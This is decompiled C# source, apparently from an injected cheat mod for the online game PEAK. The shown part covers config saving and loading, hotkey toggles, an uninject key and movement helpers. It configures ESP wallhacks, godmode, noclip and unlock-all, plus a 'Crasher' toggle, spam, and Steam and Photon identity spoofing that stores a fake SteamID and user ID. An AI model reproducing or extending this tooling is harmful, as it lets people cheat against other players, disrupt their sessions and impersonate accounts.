				PlayerPrefs.SetInt("PEAK_CHEAT_ItemBoxESP", CheatConfig.ItemBoxESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_ItemBox3D", CheatConfig.ItemBox3D ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_ItemNameESP", CheatConfig.ItemNameESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_ItemDistanceESP", CheatConfig.ItemDistanceESP ? 1 : 0);
				PlayerPrefs.SetFloat("PEAK_CHEAT_ItemESPMaxDistance", CheatConfig.ItemESPMaxDistance);
				PlayerPrefs.SetInt("PEAK_CHEAT_LuggageBoxESP", CheatConfig.LuggageBoxESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_LuggageNameESP", CheatConfig.LuggageNameESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_LuggageDistanceESP", CheatConfig.LuggageDistanceESP ? 1 : 0);
				PlayerPrefs.SetFloat("PEAK_CHEAT_LuggageESPMaxDistance", CheatConfig.LuggageESPMaxDistance);
				PlayerPrefs.SetInt("PEAK_CHEAT_EnvironmentalESP", CheatConfig.EnvironmentalESP ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_Godmode", CheatConfig.Godmode ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_Speed", CheatConfig.Speed ? 1 : 0);
				PlayerPrefs.SetFloat("PEAK_CHEAT_SpeedMultiply", CheatConfig.SpeedMultiply);
				PlayerPrefs.SetInt("PEAK_CHEAT_FlyMode", CheatConfig.FlyMode ? 1 : 0);
				PlayerPrefs.SetFloat("PEAK_CHEAT_FlySpeed", CheatConfig.FlySpeed);
				PlayerPrefs.SetInt("PEAK_CHEAT_NoClip", CheatConfig.NoClip ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_NoFallDamage", CheatConfig.NoFallDamage ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_SuperJump", CheatConfig.SuperJump ? 1 : 0);
				PlayerPrefs.SetFloat("PEAK_CHEAT_JumpMultiplier", CheatConfig.JumpMultiplier);
				PlayerPrefs.SetFloat("PEAK_CHEAT_ClimbingSpeedMultiplier", CheatConfig.ClimbingSpeedMultiplier);
				PlayerPrefs.SetFloat("PEAK_CHEAT_FallDamagePercent", CheatConfig.FallDamagePercent);
				PlayerPrefs.SetInt("PEAK_CHEAT_ReduceStaminaConsumption", CheatConfig.ReduceStaminaConsumption ? 1 : 0);
				PlayerPrefs.SetFloat("PEAK_CHEAT_StaminaConsumptionPercent", CheatConfig.StaminaConsumptionPercent);
				PlayerPrefs.SetInt("PEAK_CHEAT_InfiniteAmmo", CheatConfig.InfiniteAmmo ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_RapidFire", CheatConfig.RapidFire ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_NoInteractCooldown", CheatConfig.NoInteractCooldown ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_RapidCooldown", CheatConfig.RapidCooldown);
				PlayerPrefs.SetFloat("PEAK_CHEAT_FireRateCooldown", CheatConfig.FireRateCooldown);
				PlayerPrefs.SetInt("PEAK_CHEAT_ClearStatuses", CheatConfig.ClearStatuses ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_RandomOutfits", CheatConfig.RandomOutfits ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_SetFieldOfView", CheatConfig.SetFieldOfView ? 1 : 0);
				PlayerPrefs.SetFloat("PEAK_CHEAT_FieldOfView", CheatConfig.FieldOfView);
				PlayerPrefs.SetInt("PEAK_CHEAT_UnlockAll", CheatConfig.UnlockAll ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_BingBongSpam", CheatConfig.BingBongSpam ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_Crasher", CheatConfig.Crasher ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_BoxFix", CheatConfig.BoxFix ? 1 : 0);
				PlayerPrefs.SetInt("PEAK_CHEAT_SteamSpoofingEnabled", SteamSpoofing.SpoofEnabled ? 1 : 0);
				PlayerPrefs.SetString("PEAK_CHEAT_SpoofedUsername", SteamSpoofing.SpoofedUsername ?? "");
				PlayerPrefs.SetString("PEAK_CHEAT_SpoofedSteamID", SteamSpoofing.SpoofedSteamID.ToString());
				PlayerPrefs.SetString("PEAK_CHEAT_SpoofedPhotonUserID", SteamSpoofing.SpoofedPhotonUserID ?? "");
				if (Cheat.instance != null)
				{
					PlayerPrefs.SetInt("PEAK_CHEAT_MenuToggleKey", Cheat.instance.toggleKey);
				}
				PlayerPrefs.SetInt("PEAK_CHEAT_ShowWatermark", CheatConfig.ShowWatermark ? 1 : 0);
				PlayerPrefs.SetString("PEAK_CHEAT_CONFIG_" + configName, JsonUtility.ToJson((object)new ConfigData
				{
					playerBoxESP = CheatConfig.PlayerBoxESP,
					godmode = CheatConfig.Godmode,
					speed = CheatConfig.Speed,
					speedMultiply = CheatConfig.SpeedMultiply
				}));
				List<string> configList = GetConfigList();
				if (!configList.Contains(configName))
				{
					configList.Add(configName);
					SaveConfigList(configList);
				}
				PlayerPrefs.Save();
				Debug.Log((object)("[ConfigManager] Configuration '" + configName + "' saved successfully"));
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[ConfigManager] Error saving config: " + ex.Message));
			}
		}

		public static void LoadConfig(string configName = null)
		{
			if (string.IsNullOrEmpty(configName))
			{
				configName = PlayerPrefs.GetString("PEAK_CURRENT_CONFIG", "default");
			}
			CurrentConfigName = configName;
			string text = "PEAK_CHEAT_CONFIG_" + configName;
			if (PlayerPrefs.HasKey(text))
			{
				try
				{
					JsonUtility.FromJson<ConfigData>(PlayerPrefs.GetString(text));
				}
				catch
				{
				}
			}
			try
			{
				if (PlayerPrefs.HasKey("PEAK_CHEAT_PlayerBoxESP"))
				{
					CheatConfig.PlayerBoxESP = PlayerPrefs.GetInt("PEAK_CHEAT_PlayerBoxESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_PlayerBox3D"))
				{
					CheatConfig.PlayerBox3D = PlayerPrefs.GetInt("PEAK_CHEAT_PlayerBox3D") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_PlayerNameESP"))
				{
					CheatConfig.PlayerNameESP = PlayerPrefs.GetInt("PEAK_CHEAT_PlayerNameESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_PlayerSkeletonESP"))
				{
					CheatConfig.PlayerSkeletonESP = PlayerPrefs.GetInt("PEAK_CHEAT_PlayerSkeletonESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_PlayerDistanceESP"))
				{
					CheatConfig.PlayerDistanceESP = PlayerPrefs.GetInt("PEAK_CHEAT_PlayerDistanceESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_PlayerHealthESP"))
				{
					CheatConfig.PlayerHealthESP = PlayerPrefs.GetInt("PEAK_CHEAT_PlayerHealthESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_EntityBoxESP"))
				{
					CheatConfig.EntityBoxESP = PlayerPrefs.GetInt("PEAK_CHEAT_EntityBoxESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_EntityBox3D"))
				{
					CheatConfig.EntityBox3D = PlayerPrefs.GetInt("PEAK_CHEAT_EntityBox3D") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_EntityNameESP"))
				{
					CheatConfig.EntityNameESP = PlayerPrefs.GetInt("PEAK_CHEAT_EntityNameESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_EntitySkeletonESP"))
				{
					CheatConfig.EntitySkeletonESP = PlayerPrefs.GetInt("PEAK_CHEAT_EntitySkeletonESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_EntityAIStateESP"))
				{
					CheatConfig.EntityAIStateESP = PlayerPrefs.GetInt("PEAK_CHEAT_EntityAIStateESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_EntityDistanceESP"))
				{
					CheatConfig.EntityDistanceESP = PlayerPrefs.GetInt("PEAK_CHEAT_EntityDistanceESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ItemBoxESP"))
				{
					CheatConfig.ItemBoxESP = PlayerPrefs.GetInt("PEAK_CHEAT_ItemBoxESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ItemBox3D"))
				{
					CheatConfig.ItemBox3D = PlayerPrefs.GetInt("PEAK_CHEAT_ItemBox3D") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ItemNameESP"))
				{
					CheatConfig.ItemNameESP = PlayerPrefs.GetInt("PEAK_CHEAT_ItemNameESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ItemDistanceESP"))
				{
					CheatConfig.ItemDistanceESP = PlayerPrefs.GetInt("PEAK_CHEAT_ItemDistanceESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ItemESPMaxDistance"))
				{
					CheatConfig.ItemESPMaxDistance = PlayerPrefs.GetFloat("PEAK_CHEAT_ItemESPMaxDistance");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_LuggageBoxESP"))
				{
					CheatConfig.LuggageBoxESP = PlayerPrefs.GetInt("PEAK_CHEAT_LuggageBoxESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_LuggageNameESP"))
				{
					CheatConfig.LuggageNameESP = PlayerPrefs.GetInt("PEAK_CHEAT_LuggageNameESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_LuggageDistanceESP"))
				{
					CheatConfig.LuggageDistanceESP = PlayerPrefs.GetInt("PEAK_CHEAT_LuggageDistanceESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_LuggageESPMaxDistance"))
				{
					CheatConfig.LuggageESPMaxDistance = PlayerPrefs.GetFloat("PEAK_CHEAT_LuggageESPMaxDistance");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_EnvironmentalESP"))
				{
					CheatConfig.EnvironmentalESP = PlayerPrefs.GetInt("PEAK_CHEAT_EnvironmentalESP") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_Godmode"))
				{
					CheatConfig.Godmode = PlayerPrefs.GetInt("PEAK_CHEAT_Godmode") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_Speed"))
				{
					CheatConfig.Speed = PlayerPrefs.GetInt("PEAK_CHEAT_Speed") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_SpeedMultiply"))
				{
					CheatConfig.SpeedMultiply = PlayerPrefs.GetFloat("PEAK_CHEAT_SpeedMultiply");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_FlyMode"))
				{
					CheatConfig.FlyMode = PlayerPrefs.GetInt("PEAK_CHEAT_FlyMode") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_FlySpeed"))
				{
					CheatConfig.FlySpeed = PlayerPrefs.GetFloat("PEAK_CHEAT_FlySpeed");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_NoClip"))
				{
					CheatConfig.NoClip = PlayerPrefs.GetInt("PEAK_CHEAT_NoClip") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_NoFallDamage"))
				{
					CheatConfig.NoFallDamage = PlayerPrefs.GetInt("PEAK_CHEAT_NoFallDamage") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_SuperJump"))
				{
					CheatConfig.SuperJump = PlayerPrefs.GetInt("PEAK_CHEAT_SuperJump") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_JumpMultiplier"))
				{
					CheatConfig.JumpMultiplier = PlayerPrefs.GetFloat("PEAK_CHEAT_JumpMultiplier");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ClimbingSpeedMultiplier"))
				{
					CheatConfig.ClimbingSpeedMultiplier = PlayerPrefs.GetFloat("PEAK_CHEAT_ClimbingSpeedMultiplier");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_FallDamagePercent"))
				{
					CheatConfig.FallDamagePercent = PlayerPrefs.GetFloat("PEAK_CHEAT_FallDamagePercent");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ReduceStaminaConsumption"))
				{
					CheatConfig.ReduceStaminaConsumption = PlayerPrefs.GetInt("PEAK_CHEAT_ReduceStaminaConsumption") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_StaminaConsumptionPercent"))
				{
					CheatConfig.StaminaConsumptionPercent = PlayerPrefs.GetFloat("PEAK_CHEAT_StaminaConsumptionPercent");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_InfiniteAmmo"))
				{
					CheatConfig.InfiniteAmmo = PlayerPrefs.GetInt("PEAK_CHEAT_InfiniteAmmo") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_RapidFire"))
				{
					CheatConfig.RapidFire = PlayerPrefs.GetInt("PEAK_CHEAT_RapidFire") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_NoInteractCooldown"))
				{
					CheatConfig.NoInteractCooldown = PlayerPrefs.GetInt("PEAK_CHEAT_NoInteractCooldown") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_RapidCooldown"))
				{
					CheatConfig.RapidCooldown = PlayerPrefs.GetInt("PEAK_CHEAT_RapidCooldown");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_FireRateCooldown"))
				{
					CheatConfig.FireRateCooldown = PlayerPrefs.GetFloat("PEAK_CHEAT_FireRateCooldown");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ClearStatuses"))
				{
					CheatConfig.ClearStatuses = PlayerPrefs.GetInt("PEAK_CHEAT_ClearStatuses") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_RandomOutfits"))
				{
					CheatConfig.RandomOutfits = PlayerPrefs.GetInt("PEAK_CHEAT_RandomOutfits") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_SetFieldOfView"))
				{
					CheatConfig.SetFieldOfView = PlayerPrefs.GetInt("PEAK_CHEAT_SetFieldOfView") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_FieldOfView"))
				{
					CheatConfig.FieldOfView = PlayerPrefs.GetFloat("PEAK_CHEAT_FieldOfView");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_UnlockAll"))
				{
					CheatConfig.UnlockAll = PlayerPrefs.GetInt("PEAK_CHEAT_UnlockAll") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_BingBongSpam"))
				{
					CheatConfig.BingBongSpam = PlayerPrefs.GetInt("PEAK_CHEAT_BingBongSpam") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_Crasher"))
				{
					CheatConfig.Crasher = PlayerPrefs.GetInt("PEAK_CHEAT_Crasher") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_BoxFix"))
				{
					CheatConfig.BoxFix = PlayerPrefs.GetInt("PEAK_CHEAT_BoxFix") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_SteamSpoofingEnabled"))
				{
					SteamSpoofing.SpoofEnabled = PlayerPrefs.GetInt("PEAK_CHEAT_SteamSpoofingEnabled") == 1;
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_SpoofedUsername"))
				{
					SteamSpoofing.SetSpoofedUsername(PlayerPrefs.GetString("PEAK_CHEAT_SpoofedUsername"));
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_SpoofedSteamID"))
				{
					string @string = PlayerPrefs.GetString("PEAK_CHEAT_SpoofedSteamID");
					if (!string.IsNullOrEmpty(@string) && ulong.TryParse(@string, out var result))
					{
						SteamSpoofing.SetSpoofedSteamID(result);
					}
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_SpoofedPhotonUserID"))
				{
					SteamSpoofing.SetSpoofedPhotonUserID(PlayerPrefs.GetString("PEAK_CHEAT_SpoofedPhotonUserID"));
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_MenuToggleKey") && Cheat.instance != null)
				{
					Cheat.instance.toggleKey = PlayerPrefs.GetInt("PEAK_CHEAT_MenuToggleKey");
				}
				if (PlayerPrefs.HasKey("PEAK_CHEAT_ShowWatermark"))
				{
					CheatConfig.ShowWatermark = PlayerPrefs.GetInt("PEAK_CHEAT_ShowWatermark") == 1;
				}
				Debug.Log((object)("[ConfigManager] Configuration '" + configName + "' loaded successfully"));
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[ConfigManager] Error loading config: " + ex.Message));
			}
		}

		public static void DeleteConfig(string configName)
		{
			if (configName == "default")
			{
				Debug.LogWarning((object)"[ConfigManager] Cannot delete default config");
				return;
			}
			PlayerPrefs.DeleteKey("PEAK_CHEAT_CONFIG_" + configName);
			List<string> configList = GetConfigList();
			configList.Remove(configName);
			SaveConfigList(configList);
			if (CurrentConfigName == configName)
			{
				CurrentConfigName = "default";
				LoadConfig("default");
			}
			PlayerPrefs.Save();
			Debug.Log((object)("[ConfigManager] Configuration '" + configName + "' deleted"));
		}
	}
	public static class HotkeyManager
	{
		private const string HOTKEY_PREFIX = "PEAK_HOTKEY_";

		private static Dictionary<string, KeyCode> hotkeys = new Dictionary<string, KeyCode>();

		private static Dictionary<string, Action> toggleActions = new Dictionary<string, Action>();

		private static Dictionary<string, float> lastPressTime = new Dictionary<string, float>();

		private const float KEY_PRESS_DELAY = 0.2f;

		public static void Initialize()
		{
			LoadHotkeys();
			RegisterDefaultActions();
		}

		private static void RegisterDefaultActions()
		{
			RegisterAction("Godmode", delegate
			{
				CheatConfig.Godmode = !CheatConfig.Godmode;
			});
			RegisterAction("Speed", delegate
			{
				CheatConfig.Speed = !CheatConfig.Speed;
			});
			RegisterAction("FlyMode", delegate
			{
				CheatConfig.FlyMode = !CheatConfig.FlyMode;
			});
			RegisterAction("NoClip", delegate
			{
				CheatConfig.NoClip = !CheatConfig.NoClip;
			});
			RegisterAction("SuperJump", delegate
			{
				CheatConfig.SuperJump = !CheatConfig.SuperJump;
			});
			RegisterAction("InfiniteAmmo", delegate
			{
				CheatConfig.InfiniteAmmo = !CheatConfig.InfiniteAmmo;
			});
			RegisterAction("RapidFire", delegate
			{
				CheatConfig.RapidFire = !CheatConfig.RapidFire;
			});
			RegisterAction("NoInteractCooldown", delegate
			{
				CheatConfig.NoInteractCooldown = !CheatConfig.NoInteractCooldown;
			});
			RegisterAction("NoFallDamage", delegate
			{
				CheatConfig.NoFallDamage = !CheatConfig.NoFallDamage;
			});
			RegisterAction("ReduceStaminaConsumption", delegate
			{
				CheatConfig.ReduceStaminaConsumption = !CheatConfig.ReduceStaminaConsumption;
			});
			RegisterAction("UnlockAll", delegate
			{
				CheatConfig.UnlockAll = !CheatConfig.UnlockAll;
			});
			RegisterAction("SetFieldOfView", delegate
			{
				CheatConfig.SetFieldOfView = !CheatConfig.SetFieldOfView;
			});
			RegisterAction("EntityNameESP", delegate
			{
				CheatConfig.EntityNameESP = !CheatConfig.EntityNameESP;
			});
			RegisterAction("EntitySkeletonESP", delegate
			{
				CheatConfig.EntitySkeletonESP = !CheatConfig.EntitySkeletonESP;
			});
			RegisterAction("ItemNameESP", delegate
			{
				CheatConfig.ItemNameESP = !CheatConfig.ItemNameESP;
			});
			RegisterAction("LuggageBoxESP", delegate
			{
				CheatConfig.LuggageBoxESP = !CheatConfig.LuggageBoxESP;
			});
			RegisterAction("LuggageNameESP", delegate
			{
				CheatConfig.LuggageNameESP = !CheatConfig.LuggageNameESP;
			});
			RegisterAction("SporeShroomESP", delegate
			{
				CheatConfig.SporeShroomESP = !CheatConfig.SporeShroomESP;
			});
			RegisterAction("EnvironmentalESP", delegate
			{
				CheatConfig.EnvironmentalESP = !CheatConfig.EnvironmentalESP;
			});
			RegisterAction("ObjectNameESP", delegate
			{
				CheatConfig.ObjectNameESP = !CheatConfig.ObjectNameESP;
			});
			RegisterAction("AutoPathfinder", delegate
			{
				CheatConfig.AutoPathfinderEnabled = !CheatConfig.AutoPathfinderEnabled;
			});
			RegisterAction("GravityGun", delegate
			{
			});
			RegisterAction("PlayerBoxESP", delegate
			{
				CheatConfig.PlayerBoxESP = !CheatConfig.PlayerBoxESP;
			});
			RegisterAction("PlayerBox3D", delegate
			{
				CheatConfig.PlayerBox3D = !CheatConfig.PlayerBox3D;
			});
			RegisterAction("PlayerNameESP", delegate
			{
				CheatConfig.PlayerNameESP = !CheatConfig.PlayerNameESP;
			});
			RegisterAction("PlayerSkeletonESP", delegate
			{
				CheatConfig.PlayerSkeletonESP = !CheatConfig.PlayerSkeletonESP;
			});
			RegisterAction("PlayerDistanceESP", delegate
			{
				CheatConfig.PlayerDistanceESP = !CheatConfig.PlayerDistanceESP;
			});
			RegisterAction("PlayerHealthESP", delegate
			{
				CheatConfig.PlayerHealthESP = !CheatConfig.PlayerHealthESP;
			});
			RegisterAction("EntityBoxESP", delegate
			{
				CheatConfig.EntityBoxESP = !CheatConfig.EntityBoxESP;
			});
			RegisterAction("EntityBox3D", delegate
			{
				CheatConfig.EntityBox3D = !CheatConfig.EntityBox3D;
			});
			RegisterAction("EntityDistanceESP", delegate
			{
				CheatConfig.EntityDistanceESP = !CheatConfig.EntityDistanceESP;
			});
			RegisterAction("EntityAIStateESP", delegate
			{
				CheatConfig.EntityAIStateESP = !CheatConfig.EntityAIStateESP;
			});
			RegisterAction("ItemBoxESP", delegate
			{
				CheatConfig.ItemBoxESP = !CheatConfig.ItemBoxESP;
			});
			RegisterAction("ItemBox3D", delegate
			{
				CheatConfig.ItemBox3D = !CheatConfig.ItemBox3D;
			});
			RegisterAction("ItemDistanceESP", delegate
			{
				CheatConfig.ItemDistanceESP = !CheatConfig.ItemDistanceESP;
			});
			RegisterAction("LuggageDistanceESP", delegate
			{
				CheatConfig.LuggageDistanceESP = !CheatConfig.LuggageDistanceESP;
			});
			RegisterAction("ClimbingPrediction", delegate
			{
				CheatConfig.ClimbingPredictionEnabled = !CheatConfig.ClimbingPredictionEnabled;
			});
			RegisterAction("ClearStatuses", delegate
			{
				CheatConfig.ClearStatuses = !CheatConfig.ClearStatuses;
			});
			RegisterAction("RandomOutfits", delegate
			{
				CheatConfig.RandomOutfits = !CheatConfig.RandomOutfits;
			});
			RegisterAction("AntiFallOver", delegate
			{
				CheatConfig.AntiFallOver = !CheatConfig.AntiFallOver;
			});
			RegisterAction("CheaterDetection", delegate
			{
				CheatConfig.CheaterDetectionEnabled = !CheatConfig.CheaterDetectionEnabled;
			});
		}

		public static void RegisterAction(string featureName, Action toggleAction)
		{
			if (toggleActions.ContainsKey(featureName))
			{
				toggleActions[featureName] = toggleAction;
			}
			else
			{
				toggleActions.Add(featureName, toggleAction);
			}
		}

		public static void SetHotkey(string featureName, KeyCode keyCode)
		{
			if ((int)keyCode == 0)
			{
				if (hotkeys.ContainsKey(featureName))
				{
					hotkeys.Remove(featureName);
				}
			}
			else
			{
				KeyValuePair<string, KeyCode> keyValuePair = hotkeys.FirstOrDefault((KeyValuePair<string, KeyCode> kvp) => kvp.Value == keyCode && kvp.Key != featureName);
				if (keyValuePair.Key != null)
				{
					Debug.LogWarning((object)$"[HotkeyManager] Key {keyCode} is already assigned to {keyValuePair.Key}. Removing old assignment.");
					hotkeys.Remove(keyValuePair.Key);
				}
				hotkeys[featureName] = keyCode;
			}
			SaveHotkeys();
		}

		public static KeyCode GetHotkey(string featureName)
		{
			if (!hotkeys.ContainsKey(featureName))
			{
				return (KeyCode)0;
			}
			return hotkeys[featureName];
		}

		public static string GetKeyDisplayName(KeyCode keyCode)
		{
			if ((int)keyCode == 0)
			{
				return "None";
			}
			string text = ((object)(KeyCode)(ref keyCode)).ToString();
			if (text.StartsWith("Alpha"))
			{
				return text.Substring(5);
			}
			if (text.StartsWith("Keypad"))
			{
				return "Num" + text.Substring(6);
			}
			return text switch
			{
				"LeftControl" => "L Ctrl", 
				"RightControl" => "R Ctrl", 
				"LeftShift" => "L Shift", 
				"RightShift" => "R Shift", 
				"LeftAlt" => "L Alt", 
				"RightAlt" => "R Alt", 
				_ => text, 
			};
		}

		public static void Update()
		{
			if (Cheat.instance == null || Cheat.instance.toggled)
			{
				return;
			}
			float time = Time.time;
			foreach (KeyValuePair<string, KeyCode> item in hotkeys.ToList())
			{
				string key = item.Key;
				KeyCode value = item.Value;
				if ((int)value != 0 && Input.GetKeyDown(value) && (!lastPressTime.ContainsKey(key) || !(time - lastPressTime[key] < 0.2f)) && toggleActions.ContainsKey(key))
				{
					try
					{
						toggleActions[key]();
						lastPressTime[key] = time;
						Debug.Log((object)$"[HotkeyManager] Toggled {key} with {value}");
					}
					catch (Exception ex)
					{
						Debug.LogError((object)("[HotkeyManager] Error toggling " + key + ": " + ex.Message));
					}
				}
			}
		}

		public static void SaveHotkeys()
		{
			try
			{
				PlayerPrefs.SetInt("PEAK_HOTKEY_Count", hotkeys.Count);
				int num = 0;
				foreach (KeyValuePair<string, KeyCode> hotkey in hotkeys)
				{
					PlayerPrefs.SetString("PEAK_HOTKEY_" + $"Feature_{num}", hotkey.Key);
					PlayerPrefs.SetInt("PEAK_HOTKEY_" + $"KeyCode_{num}", (int)hotkey.Value);
					num++;
				}
				PlayerPrefs.Save();
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[HotkeyManager] Error saving hotkeys: " + ex.Message));
			}
		}

		public static void LoadHotkeys()
		{
			try
			{
				hotkeys.Clear();
				if (!PlayerPrefs.HasKey("PEAK_HOTKEY_Count"))
				{
					return;
				}
				int @int = PlayerPrefs.GetInt("PEAK_HOTKEY_Count");
				for (int i = 0; i < @int; i++)
				{
					if (PlayerPrefs.HasKey("PEAK_HOTKEY_" + $"Feature_{i}") && PlayerPrefs.HasKey("PEAK_HOTKEY_" + $"KeyCode_{i}"))
					{
						string @string = PlayerPrefs.GetString("PEAK_HOTKEY_" + $"Feature_{i}");
						KeyCode val = (KeyCode)PlayerPrefs.GetInt("PEAK_HOTKEY_" + $"KeyCode_{i}");
						if ((int)val != 0)
						{
							hotkeys[@string] = val;
						}
					}
				}
				Debug.Log((object)$"[HotkeyManager] Loaded {hotkeys.Count} hotkeys");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[HotkeyManager] Error loading hotkeys: " + ex.Message));
			}
		}

		public static List<string> GetRegisteredFeatures()
		{
			return toggleActions.Keys.ToList();
		}
	}
	public static class InputHandler
	{
		private const int VK_DELETE = 46;

		private const int VK_INSERT = 45;

		private const int VK_LEFT_MOUSE = 1;

		private const int VK_MIDDLE_MOUSE = 4;

		[DllImport("user32.dll")]
		private static extern short GetAsyncKeyState(int vKey);

		public static void CheckMenuToggle(ref bool toggled, ref float lastToggleTime, ref float lastUninjectTime, float toggleDelay, int toggleKey)
		{
			if (GetAsyncKeyState(toggleKey) < 0 && Time.time - lastToggleTime >= toggleDelay)
			{
				toggled = !toggled;
				lastToggleTime = Time.time;
			}
			if (GetAsyncKeyState(46) < 0 && Time.time - lastUninjectTime >= toggleDelay)
			{
				Cheat.Uninject();
				lastUninjectTime = Time.time;
			}
		}

		public static bool IsLeftMousePressed()
		{
			return (GetAsyncKeyState(1) & 0x8000) != 0;
		}

		public static bool IsMiddleMousePressed()
		{
			return (GetAsyncKeyState(4) & 0x8001) != 0;
		}

		public static void HandleCursor(bool menuOpen, ref bool lastMenuState, ref bool wasCursorVisibleBeforeMenu)
		{
			if (menuOpen)
			{
				Cursor.visible = true;
				Cursor.lockState = CursorLockMode.None;
				if (!lastMenuState)
				{
					wasCursorVisibleBeforeMenu = Cursor.visible;
				}
			}
			else
			{
				Scene activeScene = SceneManager.GetActiveScene();
				string name = (activeScene).name;
				if (name.Contains("Menu") || name.Contains("Main") || name.Contains("Lobby") || name == "MainMenu" || !name.Contains("Game"))
				{
					Cursor.visible = true;
					Cursor.lockState = CursorLockMode.None;
				}
				else
				{
					Cursor.visible = false;
					Cursor.lockState = (CursorLockMode)1;
				}
			}
			lastMenuState = menuOpen;
		}
	}
	public static class AntiFallOver
	{
		public static void Apply()
		{
			if (!CheatConfig.AntiFallOver || Character.localCharacter == null || !Character.localCharacter.photonView.IsMine)
			{
				return;
			}
			try
			{
				if (Character.localCharacter.data != null)
				{
					if (Character.localCharacter.data.fallSeconds > 0f)
					{
						Character.localCharacter.data.fallSeconds = 0f;
					}
					if ((Object)(object)Character.localCharacter.refs?.view != (Object)null)
					{
						Character.localCharacter.refs.view.RPC("RPCA_UnFall", RpcTarget.All, Array.Empty<object>());
					}
				}
			}
			catch
			{
			}
		}
	}
	public static class AutoPathfinder
	{
		private static bool enabled = false;

		private static bool followingPath = false;

		private static Vector3 targetPosition = Vector3.zero;

		private static float lastTargetCheck = 0f;

		private static float targetCheckInterval = 1f;

		private static List<Vector3> pathLine = new List<Vector3>();

		public static bool Enabled
		{
			get
			{
				return enabled;
			}
			set
			{
				bool flag = enabled;
				enabled = value;
				if (!enabled)
				{
					StopFollowing();
				}
				else if (!flag)
				{
					StartPathfinding();
				}
			}
		}

		public static bool FollowingPath => followingPath;

		public static int PathNodeCount => pathLine.Count;

		public static void Initialize(MonoBehaviour runner)
		{
		}

		private static void StartPathfinding()
		{
			if (!(Character.localCharacter == null))
			{
				StopFollowing();
				Vector3 val = FindCampfire();
				if (val == Vector3.zero)
				{
					Debug.Log((object)"[AutoPathfinder] No campfire found - disabling feature");
					enabled = false;
